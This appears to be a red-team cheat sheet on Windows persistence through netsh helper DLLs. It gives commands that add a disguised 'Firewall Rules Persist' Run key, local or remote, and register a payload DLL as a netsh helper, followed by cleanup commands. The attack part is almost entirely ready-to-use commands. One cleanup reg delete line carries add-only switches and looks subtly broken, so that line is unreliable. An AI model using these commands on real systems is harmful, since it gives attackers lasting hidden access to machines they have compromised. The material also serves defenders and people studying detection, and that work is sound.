---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1128
  - windows
---
# Netsh

## Backdoor

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Firewall Rules Persist" /t REG_SZ /d "C:\Windows\System32\netsh" /f

C:\> netsh.exe add helper C:\path\to\payload.dll
```

Interactive prompt.

```
C:\> netsh.exe

netsh> add helper C:\path\to\payload.dll
```

## CleanUp

To cleanup the backdoor just specify the path to DLL payload.

```
C:\> netsh.exe delete helper C:\path\to\payload.dll
```

This can be done with an interactive prompt.

```
C:\> netsh.exe

netsh> delete helper C:\path\to\payload.dll
```

Delete the registry entry.

```
C:\> reg.exe delete "HKLM\SOFTWARE\Microsoft\NetSh" /v payload /f

C:\> reg.exe delete "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Firewall Rules Persist" /t REG_SZ /d "C:\Windows\System32\netsh" /f
```

---
## References

### Persistence Info

- [Persistence Info: `netsh.exe` extensions ](https://persistence-info.github.io/Data/netsh.html)

### Red Team Notes

- [Red Team Notes: NetSh Helper DLL](https://www.ired.team/offensive-security/persistence/t1128-netsh-helper-dll)